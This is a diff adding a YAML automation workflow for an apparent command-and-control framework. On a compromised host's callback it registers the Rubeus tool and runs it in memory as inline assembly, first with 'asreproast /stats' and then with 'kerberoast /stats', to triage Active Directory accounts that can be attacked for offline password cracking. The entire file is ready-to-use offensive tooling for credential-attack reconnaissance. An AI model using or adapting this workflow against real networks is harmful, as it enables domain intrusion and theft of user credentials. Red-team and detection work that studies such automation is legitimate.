@@ -1,0 +1,52 @@
+name: "forget_net_Rubeus"
+description: "Register and run Rubeus via forge_net"
+trigger: manual
+run_as: self
+
+steps:
+###########################################################
+# Rubeus
+###########################################################
+  - name: "register forge_net_Rubeus"
+    depends_on: []
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_register
+      payload_type: forge
+      params_dictionary:
+        collectionName: SharpCollection
+        commandName: Rubeus
+        remove: false
+
+  - name: "asreproast triage forge_net_Rubeus"
+    depends_on:
+      - "register forge_net_Rubeus"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_net_Rubeus
+      payload_type: forge
+      params_dictionary:
+        args: "asreproast /stats"
+        version: 4.7_Any
+        execution: inline_assembly
+
+  - name: "kerberoast triage forge_net_Rubeus"
+    depends_on:
+      - "asreproast triage forge_net_Rubeus"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      command_name: forge_net_Rubeus
+      payload_type: forge
+      params_dictionary:
+        args: "kerberoast /stats"
+        version: 4.7_Any
+        execution: inline_assembly
